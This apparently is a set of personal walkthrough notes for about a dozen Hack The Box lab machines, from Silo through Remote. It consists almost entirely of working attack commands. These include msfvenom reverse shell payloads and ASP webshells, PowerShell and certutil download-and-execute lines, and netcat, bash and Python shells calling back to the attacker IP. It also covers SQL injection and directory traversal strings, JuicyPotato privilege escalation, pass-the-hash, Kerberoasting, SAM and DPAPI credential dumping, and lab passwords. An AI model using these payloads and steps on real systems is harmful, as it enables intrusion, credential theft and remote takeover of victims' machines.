sudo alien --to-deb *.rpm
sudo dpkg -i *.deb
nano /etc/profile
	export ORACLE_HOME=/usr/lib/oracle/21/client64/
	export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
	export PATH=${ORACLE_HOME}bin:$PATH
nano /etc/ld.so.conf.d/oracle.conf
	/usr/lib/oracle/21/client64/lib/
ldconfig
pip3 install cx_Oracle
python3 odat.py
which sqlplus
sqlplus -V
	##pentest with odat
	#bruteforce sid oracle
odat sidguesser -s 10.10.10.82
	#got valid SID XE,CLRExtProc,PLSExtProc
	#bruteforce user
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE
nmap -sT -p 1521 -Pn --script oracle-brute --script-args "unpwdb.timelimit=3h,oracle-brute.sid=XE,userdb=users-oracle.txt,passdb=pass-oracle.txt" 10.10.10.82
	#got credz scott:tiger
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger
sqlplus SCOTT/tiger@10.10.10.82:1521/XE
>select * from user_role_privs;
>select * from cat;
>select banner from v$version;
	#login as sysdba
sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
>select * from user_role_privs;
	#got all priv
	#oracle reverse shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9191 -f exe -o b.exe
python3 odat.py all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile 'C:\' a.exe b.exe
python3 odat.py externaltable -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --exec 'C:\' a.exe
rlwrap nc -lvp 9191
>whoami
	nt authority\system
	#aspx reverse shell
wget https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
python3 odat.py utlfile -s 10.10.10.82 -U SCOTT -P tiger -d XE --sysdba --putFile C:\\inetpub\\wwwroot rev.aspx rev.aspx
curl http://10.10.10.82/rev.aspx
rlwrap nc -lvp 9292
>whoami
	iis apppool\defaultapppool
>whoami /priv
	#privesc SeImpersonatePrivilege
	#Microsoft Windows Server 2012 R2 Standard
	#6.3.9600 N/A Build 9600
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system
	##another insane privesc memory dump memdump
	#https://github.com/volatilityfoundation/volatility
>type "c:\Users\Phineas\Desktop\Oracle issue.txt"
>copy "Oracle issue.txt" \\10.10.14.6\asd\oracle.txt
mousepad oracle.txt
gedit oracle.txt
	#got valid password £%Hm8646uC$
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
unzip SILO-20180105-221806.zip
	#scan header krgb
./volatility_2.6_lin64_standalone kdbgscan -f SILO-20180105-221806.dmp
	#automatic scan header krgb
./volatility_2.6_lin64_standalone imageinfo -f SILO-20180105-221806.dmp
	#investigate dump
./volatility_2.6_lin64_standalone -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
	#there are SYSTEM and SAM so dump the hash
./volatility_2.6_lin64_standalone -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
	#got Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
	#pass the hash
evil-winrm -i 10.10.10.82 -u 'administrator' -H '9e730375b7cbcebf74ae46481e07b0c7'
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
>whoami
	nt authority\system






Bounty Hackthebox
====================================
sudo autorecon 10.10.10.93
cat tcp_80_http_dirb.txt
http://10.10.10.93/transfer.aspx
	##abuse file upload
	#fuzz extention with extention payload with burp
	#https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4
	#extention allowed jpg, png, jpeg, xls, doc, xlsx, docx, config
	##web.config RCE IIS 6 & 7
	#https://soroush.secproject.com/blog/tag/unrestricted-file-upload/
	#https://payloads.online/archivers/2018-11-04/1/
%@ Language=VBScript %>
<% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c whoami") %>
	#another script with output
<% Response.write("-"&"->")
Response.write("")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("ipconfig")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("<!-"&"-") %>
	#web.config reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
	#change wShell.Exec("\\10.10.14.6\asd\rshell.exe")
rlwrap nc -lvp 4321
>whoami
	bounty\merlin
>whoami /priv
	#seimpoersonateprivilege privesc
	#Microsoft Windows Server 2008 R2 Datacenter
	#6.1.7600 N/A Build 7600
>mkdir temp
cd c:\temp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4321 -f exe > rshell.exe
>copy \\10.10.14.6\asd\rshell.exe
>copy \\10.10.14.6\asd\JuicyPotato.exe potato.exe
>potato.exe -h
>potato.exe -t * -l 1337 -p rshell.exe .
rlwrap nc -lvp 4321
>whoami
	nt authority\system






Jerry Hackthebox
======================================
sudo autorecon 10.10.10.95
http://10.10.10.95:8080
	#tomcat 7.0.88
	#bruteforce tomcat
wget https://gist.github.com/th3gundy/d562eb1ae5dc42d666d3aab761bd4d96#file-tomcat_bruteforce-py
python tomcat_bruteforce.py --host 10.10.10.95 --port 8080 --path /manager/html --usr user.txt --pwd password.txt
	#got credz admin:admin, tomcat:s3cret
	#user admin as manager-status (view only)
	#user tomcat as manager-gui, so login as tomcat:s3cret
http://10.10.10.95:8080/manager/html
	#tomcat webshell
https://github.com/BustedSec/webshell/blob/master/webshell.war
http://10.10.10.95:8080/webshell/index.jsp?cmd=whoami	
	#tomcat reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4321 -f exe > rshell.exe
http://10.10.10.95:8080/webshell/index.jsp?cmd=\\10.10.14.7\asd\rshell.exe
rlwrap nc -lvp 4321
	#tomcat war reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=4141 -f war -o rshell.war
http://10.10.10.95:8080/rshell
rlwrap nc -lvp 4141
>whoami
	nt authority\system










Conceal Hackthebox
======================================
sudo autorecon 10.10.10.116
	#only udp 161 (snmp) and 500 (ipsec)
cat udp_161_snmp_snmpwalk*
	#read snmp in better format with snmp-check
	#community public is default, bruteforce community with snmp onesixtyone
cat udp_161_snmp_onesixtyone.txt
snmp-check 10.10.10.116 -c public
	#got IKE VPN password PSK 9C8B1A372B1878851BE2C097031B6E43 (Dudecacke1!)
	#enumerate udp port 500
	#tunnel to ipsec udp 500 to connect local network
ike-scan -M 10.10.10.116
ike-scan -M --ikev2 10.10.10.116
	#Internet Key Exchange (IKE) is encrypted with triple DES, using SHA1 hash, and modp1024
	#auth using PSK (preshared key) and IKE v1
which ipsec (strongswan)
cat /etc/ipsec.secrets
	%any : PSK "Dudecake1!"
cat /etc/ipsec.conf
	conn Conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.14.7
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp
	#got error 3DES_CBC (key size 0) not supported!
	#install strongswan plugins
sudo apt-get install libstrongswan-standard-plugins
sudo apt-get install libstrongswan-extra-plugins
	#start ipsec tunnel
sudo ipsec start --nofork
	#load configuration
sudo ipsec up Conceal
	#tunnel is open, scan nmap with -sT for scan across ipsec for more accurate
nmap -p- -Pn 10.10.10.116 -v -sT --min-rate 1000
gobuster -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,aspx,asp,html
http://10.10.10.116/upload/
ftp 10.10.10.116
>mkdir asd
>cd asd
>put webshell.asp
	#upload webshell https://github.com/tennc/webshell/blob/master/asp/webshell.asp
http://10.10.10.116/upload/
	#improve connection tunnel inside tunnel
	#ipsec Conceal inside vpn htb in tun0
	#default mtu 1500 and idk how on earth decrease mtu tun0 (htb vpn) increase ipsec connection
sudo ifconfig tun0 mtu 1000
http://10.10.10.116/upload/webshell.asp
	#simple asp shell
cat simpecmd.asp
	<% Set rs = CreateObject("WScript.Shell")
	Set cmd = rs.Exec("cmd /c whoami")
	o = cmd.StdOut.Readall()
	Response.write(o) %>
http://10.10.10.116/upload/asd/simplecmd.asp
	#webshell reverse shell powershell nishang
	#https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
mv Invoke-PowerShellTcp.ps1 rev.ps1
	#add revese script in end of line
tail -n 1 rev.ps1
	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 4321
http://10.10.10.116/upload/webshell.asp
	powershell -c iex(New-Object Net.Webclient).downloadstring("http://10.10.14.7/rev.ps1")
	#try to change double quote to single quote due webshell code adjustment
	powershell -c iex(New-Object Net.Webclient).downloadstring('http://10.10.14.7/rev.ps1')
rlwrap nc -lvp 4321
>whoami
	conceal\destitute
>whoami /priv
	#SeImpersonatePrivilege privesc
	#Microsoft Windows 10 Enterprise
	#10.0.15063 N/A Build 15063
	#upload juicypotato
ftp 10.10.10.116
>cd asd
>binary
>put jp.exe
>put nc.exe
>put rev.vat
>cd \
>mkdir temp
>cd \temp
>cp \inetpub\wwwroot\upload\asd\* .
	#use two type of rev.bat
>type rev.bat
	powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')
	\temp\nc.exe -e cmd.exe 10.10.14.7 9191
	#change shell using cmd for better 
>.\nc.exe -e cmd.exe 10.10.14.7 4444
rlwrap nc -lvp 4444
>cd \temp\
>jp.exe -t * -p \temp\rev.bat -l 9001
	#use windows 10 enterprise CLSID
	#https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/
>jp.exe -t * -p \temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
rlwrap nc -lvp 9191
>whoami
	nt authority\system




Chatterbox Hackthebox
=====================================
	##gave up to get rce on this Achat buffer overflow
	##so i taking notes from writeup that might be helpful
	#msfvenom option
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp --list-options
	#msfvenom ping
msfvenom -a x86 --platform Windows -p windows/exec CMD='ping.exe 10.10.14.29' -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
	#msfvenom certutil
-p windows/exec CMD='cmd /k "certutil -f -split -urlcache http://10.10.14.29/shell443.exe C:\Users\Public\Documents\shell443.exe && C:\Users\Public\Documents\shell443.exe"'
	#check .NET framwork version
>dir C:\Windows\Microsoft.NET\Framework
	#administrator desktop accessable but file access denied
>icacls Desktop\
	CHATTERBOX\Alfred:(I)(OI)(CI)(F)
>icacls Desktop\ /grant Alfred:F /T
	#windows su user Administrator:Welcome1!
tail script.ps1 
	$secpasswd = ConvertTo-SecureString "Welcome1!" -AsPlainText -Force 
	$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
	Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/rshell.ps1')" -Credential $mycreds
>whoami
	chatterbox\administrator
	#privesc high privilege to system
>cmd /c "set"
>cmd /c "set"
>start PsExec.exe -i -d -accepteula -s C:\Windows\Temp\Temp\rshell.exe
rlwrap nc -lvp 4242
>whoami
	nt authority\system









Secnotes Hackthebox
=========================================
sudo autorecon 10.10.10.97
http://10.10.10.97/login.php
http://10.10.10.97/register.php
	#register user asd:asdasd
http://10.10.10.97/contact.php
	#fill with http://10.10.14.2/asd
nc -lvp 80
	#I got connection back
	##abuse CSRF
http://10.10.10.97/change_pass.php
	#try to change pass with GET request and success
	#CSRF with change password
http://10.10.10.97/contact.php
	http://127.0.0.1/change_pass.php?password=dsadsa&confirm_password=dsadsa&submit=submit
http://10.10.10.97/login.php
	login as tyler
	#got credz Tyler / 92g!mA8BGjOirkL%OG*&
	##another method second order SQL injection
http://10.10.10.97/register.php
	#register with this account
	#https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt
	a' UNION SELECT 101,102,@@version,104#
	a' UNION SELECT 101,102,database(),104#
	a' or 1=1-- -
	a' or 0=0 #"
http://10.10.10.97/login.php
http://10.10.10.97/home.php
	#got all notes in database and credz Tyler / 92g!mA8BGjOirkL%OG*&
	#login smb
smbmap -H 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&'
smbclient \\\\10.10.10.97\\new-site -U 'tyler'
>dir
>put p0wny.php
http://10.10.10.97:8808/p0wny.php
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4242 -f exe > rshell.exe
http://10.10.10.97:8808/p0wny.php
	certutil -urlcache -split -f http://10.10.14.2/rshell.exe
	dir .\rshell.exe
rlwrap nc -lvp 4242
>whoami
	secnotes\tyler
cp ../anthem/winpeas.exe .
>cd /temp/
>certutil -urlcache -split -f http://10.10.14.2/winpeas.exe
>winpeas.exe
>cd cd \Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root\
>dir
	.bashrc
	.bash_history
>type .bash_history
	smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
	#got credz administrator:u6!4ZwgwOM#^OBf#Nwnh
smbmap -H 10.10.10.97 -u 'administrator' -p 'u6!4ZwgwOM#^OBf#Nwnh'
smbclient \\\\10.10.10.97\\C$ -U 'administrator'
>smb: \users\administrator\desktop\> get root.txt
	#shell smb administrator
	#psexec required smb default 445 as administrator write/read ADMIN$ and RCP
psexec.py 'administrator':'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
>whoami
	nt authority\system
	##another method abuse wsl and get wsl shell
>whoami
	secnotes\tyler
	#check .NET Framework version to see which winpeas could run
>dir C:\Windows\Microsoft.NET\Framework
>cd \users\tyler\desktop
>type bash.lnk
>copy bash.lnk \\10.10.14.2\asd\
strings bash.lnk
>dir \windows\system32\bash.exe
	#not found search file windows
>where /R c:\ bash.exe
>where /R c:\ wsl.exe
	#wsl reverse shell
wsl.exe whoami
	root
wsl.exe python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
exec bash --login
nc -lvp 4444
>whoami
	root
	#full interactive shell
^Z
stty raw -echo
fg
>cat .bash_history
	#abuse wsl with bash.exe
	#change shell to more stable with nc.exe
>certutil -urlcache -split -f http://10.10.14.2/nc.exe
>nc.exe -e cmd 10.10.14.2
>where /R c:\ bash.exe
>bash.exe -c "ping 10.10.14.2"
	#wsl bash reverse shell
>bash.exe -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8888 >/tmp/f"
nc -lvp 8888
>id
	#another bash interactive wsl
>bash.exe
>>id
	uid=0(root) gid=0(root) groups=0(root)
>>python -c 'import pty;pty.spawn("/bin/bash")'
	#wsl bash reverse shell
>>bash -i >& /dev/tcp/10.10.14.2/9292 0>&1
exec bash --login
nc -lvp 4444
>^Z
stty raw -echo
fg
>id
>python -c 'import pty;pty.spawn("/bin/bash")'
	#full interactive shell
>exit








Bastion Hackthebox
========================================
sudo autorecon 10.10.10.134
cat smbmap-list-contents.txt
smbclient --list \\10.10.10.134 -U 'anonymous'
smbclient \\\\10.10.10.134\\backups
>get note.txt
>cd WindowsImageBackup
>cd L4mpje-PC
>cd "Backup 2019-02-22 124351"
>dir
	#there is file.vhd (virtual hard drive) which I can dump SAM and SYSTEM
	#transfer large file smb using curl
curl -T file.txt -u "domain\username:passwd" smb://server.example.com/share/
curl -u "domain\username:passwd" smb://server.example.com/share/file.txt
curl -u "domain\anonymous:asd" 'smb://10.10.10.134/backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd' > asd1.vhd
	#try to download 5GB .vhd file and it seems imposimble
sudo su
apt install libguestfs-tools -y
guestmount --add smb/asd1.vhd --inspector --ro -v mnt/vhd1
guestunmount vhd1
	#mount smb to kali
mkdir mnt
mount -t cifs //10.10.10.134/backups mnt/ -o user=anonymous,password=
guestmount --add mnt/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro mnt
	#took like fcking 15 minutes
copy mnt/Windows/System32/config/SAM \temp
copy mnt/Windows/System32/config/SYSTEM \temp
samdump2 SYSTEM SAM
hashcat -m 1000 --force 26112010952d963c8dc4217daec986d9 /opt/rockyou.txt
	#got credz L4mpje:bureaulampje
ssh l4mpje@10.10.10.134
	##using winpeas
>winpeas.exe
	#there is something in recycle bin
>cd \$Recycle.Bin
>dir /a /b /s
>type *
	NET USE Z: "\\192.168.1.74\Backups" /user:Peter 3RTTT5zNt2
	#got credz peter:3RTTT5zNt2 but useless no user name peter
	##using powerup
>. .\powerup.ps1
>Invoke-AllChecks
	#dll hijack wlbsctrl.dll in C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll
	#dll hijack wlbsctrl.dll check
	#https://github.com/securycore/Ikeext-Privesc
>. .\Ikeext-Privesc.ps1
>Invoke-IkeextCheck
	#not vulnerable (I think wlbsctrl.dll should in C:\Windows\System32\)
	##using seatbelt
>seatbelt.exe -group=all
	#dpapi master keys in C:\Users\L4mpje\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146344083-2443430429-1430880910-1002
>\\10.10.14.2\asd\mimikatz.exe
	#extract master key
	dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\{SID}" /sid:SID /password:pass /protected
#dpapi::masterkey /in:"C:\Users\L4mpje\AppData\Roaming\Microsoft\Protect\S-1-5-21-2146344083-2443430429-1430880910-1002\e5c82a4b-96bd-4a3c-bd2e-550f432b8880" /S-1-5-21-2146344083-2443430429-1430880910-1002 /password:bureaulampje /protected
	#got master key a112e16482caab32436fd1333879a06a976ed8bebd4e2e01647a513950a63fff70f30c91a763c112cf0048716eb4c4b74740a3ce5bfc8501dcfb2426372a93b5
	#extract dpapi password
	dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
#dpapi::cred /in:C:\Users\L4mpje\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:a112e16482caab32436fd1333879a06a976ed8bebd4e2e01647a513950a63fff70f30c91a763c112cf0048716eb4c4b74740a3ce5bfc8501dcfb2426372a93b5
	#nothing found and honestly idk what that was
	##list program manually
>dir "\Program Files (x86)"
	#mRemoteNG privesc
>cd "%userprofile%\AppData\Roaming\mRemoteNG\"
>copy * \\10.10.14.2\asd\
cat * | grep -i password
	#got administrator password string
	aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
wget https://github.com/haseebT/mRemoteNG-Decrypt
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
	Password: thXLHM96BeKL0ER2
ssh administrator@10.10.10.134
>whoami
	bastion\administrator
smbmap -H 10.10.10.134 -u 'administrator' -p 'thXLHM96BeKL0ER2'
	#got ADMIN$ access so can remote with psexec
psexec.py 'administrator':'thXLHM96BeKL0ER2'@10.10.10.134
>whoami
	nt authority\system








Buff Hackthebox
=======================================
sudo autorecon 10.10.10.198
http://10.10.10.198:8080/contact.php
view-source:http://10.10.10.198:8080/contact.php
	#Made using Gym Management Software 1.0
searchsploit gym management software
searchsploit -m 48506
python 48506.py
python 48506.py 'http://10.10.10.198:8080/'
>whoami
	buff\shaun
>copy \\10.10.14.2\asd\nc.exe .
	#got error You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol
	#shell are limited try to copy file
	#transfer ftp
pip3 install pyftpdlib
python3 -m pyftpdlib
	#on windows limited rce
echo open 10.10.14.2 > asd.txt
echo USER anonymous asd >> asd.txt
echo bin >> asd.txt
echo get nc.exe >> asd.txt
echo GET sel.php >> asd.txt
echo quit >> asd.txt
>ftp -v -i -n -s:asd.txt
	#ftp no error but file not trasnfered
	#add proxy to exploit (exploit proxy)
	#try to set burp bind address 127.0.0.1:8888 but fail so change the exploit code
	#https://stackoverflow.com/questions/30837839/how-can-i-set-a-single-proxy-for-a-requests-session-object
cat ex.py
    proxies = {'http': 'http://127.0.0.1:8080'}
    s = requests.Session()
    s.proxies.update(proxies)
python ex.py 'http://10.10.10.198:8080/'
	#intercept with burp and change payload with php reverse shell
	#https://github.com/ivan-sincek/php-reverse-shell
curl http://10.10.10.198:8080/upload/asdasd.php
rlwrap nc -lvp 4242
>whoami
	buff\shaun
	#after i read someone writeup, we can use smb transfer using smbv2
impacket-smbserver asd . -smb2support
python 48506.py 'http://10.10.10.198:8080/'
>copy \\10.10.14.2\asd\nc.exe
>nc.exe -e cmd.exe 10.10.14.2 4242
rlwrap nc -lvp 4242
>whoami
	buff\shaun
>winpeas.exe
>cd \users\shaun
>dir /a /b /s | findstr /V /i appdata
	C:\Users\shaun\Downloads\CloudMe_1112.exe
	#exploit CloudMe_1112.exe cloudme buffer overflow privesc
	#https://www.exploit-db.com/exploits/48389
>systeminfo
	#Microsoft Windows 10 Enterprise
	#10.0.17134 N/A Build 17134
>tasklist -V | findstr /i cloudme
>netstat -ano
	#on winpeas target already listen tcp 127.0.0.1:8888
	#windows port porward using plink.exe
locate plink.exe
	#plink error "FATAL ERROR: Couldn't agree a key exchange algorithm" so download latest exe from here
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
sudo service ssh start
	#change sshd_config to port 2222 because default vpn hackthebox block outbound port 22
sudo nano /etc/ssh/sshd_config
>echo y | plink.exe -l kali -pw kali -R 8888:127.0.0.1:8888 10.10.14.2 -P 2222
>>id
	uid=1000(kali) gid=1000(kali) groups=1000(kali)
	#got shell back to kali means port been forwarded
msfvenom -p windows/exec CMD='c:\temp\nc.exe -e cmd.exe 10.10.14.2 4141' -b '\x00\x0a\x0d' -f py -v payload
	@change exploit to localhost port 8888
python ex.py
rlwrap nc -lvp 4141
>whoami
	buff\administrator
	#privesc high privilege to system
>PsExec64.exe -i -d -accepteula -s C:\temp\nc.exe 10.10.14.2 9191 -e cmd.exe
rlwrap nc -lvp 9191
>whoami
	nt authority\system




Servmon Hackthebox
========================================
sudo autorecon 10.10.10.184
cat tcp_21_ftp_nmap.txt
ftp -p 10.10.10.184
>anonymous
>get "Notes to do.txt"
>get Confidential.txt
	#there are 2 users nadine,nathan and there are Passwords.txt on desktop
https://10.10.10.184:8443
	#nsclient web interface
searchsploit nsclient
searchsploit -m 48360
python3 48360.txt
	#try to exploit it, change password, payload, etc fail
	#unfortunedly autorecon didn't find port 80 and it takes hours to do nmap again
nmap -p- -Pn --min-rate 10000 10.10.10.184
http://10.10.10.184/Pages/login.htm
	#exploit nvms 1000
searsploit -m 47774
cat 47774.txt
	#NVMS-1000 - Directory Traversal
	GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
	#got credz L1k3B1gBut7s@W0rk
	#I know main exploit of this box is nsclient but I can't get config file using LFI
	#and default config file in C:\program files\nsclient++\nsclient.ini
GET /../../../../../../../../../../../../program files/nsclient++/nsclient.ini HTTP/1.1
	#after I read writeup (of course I finished it first) LFI payload should encode with URL
GET /../../../../../../../../../../../../program+files/nsclient%2b%2b/nsclient.ini HTTP/1.1
	password = ew2x6SsGTxjRwXOT
	allowed hosts = 127.0.0.1
hydra -L user.txt -P pass.txt 10.10.10.184 -t 4 ssh
ssh nadine@10.10.10.184
>whoami
	servmon\nadine
>cd C:\program files\nsclient++\
>nscp web -- password --display
>type nsclient.ini
	#so nsclient allowen only from 127.0.0.1
	#ssh port forward
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
https://127.0.0.1:8443
	#now nsclient web interface works
>copy \\10.10.14.2\asd\nc.exe \temp\
	#finaly exploit nsclient
python3 48360.txt -t 127.0.0.1 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c '\temp\nc.exe -e cmd 10.10.14.2 4141'
rlwrap nc -lvp 4141
>whoami
	nt authority\system
	#after I read write, there is no script at the time and access nsclient with chronium
	#so the step to execute shell are
>type evil.bat
	@echo off
	C:\Users\Nadine\Downloads\nc.exe 10.10.14.27 443 -e cmd.exe
	
	#file transfer evade defender
	#https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Servmon/File-transfer.md








Active Hackthebox
=======================================
sudo autorecon 10.10.10.100
GetNPUsers.py -dc-ip 10.10.10.100 active.htb/SVC_TGS
	No entries found!
smbmap-share-permissions.txt
smbclient \\\\10.10.10.100\\Replication
> recurse ON
> prompt OFF
> mget *
> exit
cd smbdump
find . -type f
cat cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
	#extract and decrypt cpassword from Group Policy Preferences
	#https://github.com/t0thkr1s/gpp-decrypt
python3 gpp-decrypt.py -f groups.xml
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
	#got credz active.htb\SVC_TGS:GPPstillStandingStrong2k18
	#every valid user password check it with smbmap
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
	#attacking kerberos port 88,464
	#with valid user pass try to attack AD by dumpsecret and request SPN
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
	#request spn success but kerberoasting failed
	#Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
	#date attacker with AD doesn't match so adjust kali date
sudo su
sudo apt-get install ntpdate
ntpdate 10.10.10.100
	#SPN still error and ntp also error "the NTP socket is in use, exiting"
ntpdate -u 10.10.10.100
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -save -outputfile hash.txt
	#got administrator hash and put all one line hash to has.txt
hashcat -m 13100 -a 0 hash.txt /opt/rockyou.txt
	#cracked with credz administrator:Ticketmaster1968
smbmap -H 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'
psexec.py 'administrator':'Ticketmaster1968'@10.10.10.100
	nt authority\system






Remote Hackthebox
============================================
sudo autorecon 10.10.10.180
cat tcp_111_nfs_nmap.txt
	#mount nfs port 111
showmout -e 10.10.10.180
mkdir mnt_site_backups
sudo mount 10.10.10.180:/site_backups mnt_site_backups
sudo umount mnt_site_backups/
cd mnt_site_backups
	#map tree file
find . -type f > tree-umbraco.txt
	#check umbraco version
cat Web.config | grep -i umbracoConfigurationStatus
	<add key="umbracoConfigurationStatus" value="7.12.4" />
	#find umbraco password database config
cat Web.config | grep -i -A2 -B2 -n connectionstrings
	connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;"
	#databse loaded from file Umbraco.sdf
cat tree-umbraco.txt | grep -i .sdf
	#try to read sdf file but got no hit
	#read sdf file with strings
strings Umbraco.sdf > sdf-strings.txt
mousepad sdf-strings.txt
	#got hash admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
hashid b8be16afba8c314ad33d812f22a04991b90e2aaa
	SHA1
hashcat -h | grep -i sha1
hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa /opt/rockyou.txt
	#got credz admin@htb.local:baconandcheese
http://10.10.10.180/umbraco/#/
	#find version umbraco from outsite
http://10.10.10.180/umbraco/plugins/umbracoContour/UmbracoContour.config
	404 not found
	##exploit Umbraco RCE Umbraco CMS 7.12.4
searchsploit umbraco
searchsploit -m 49488
cat 49488.py
	proxies = {'http': 'http://127.0.0.1:8080'}
	s = requests.session()
	s.proxies.update(proxies)
	r2 = s.post(url_login,json=loginfo)
	#the box is unstable and made frustating
	#exploit fail attempt
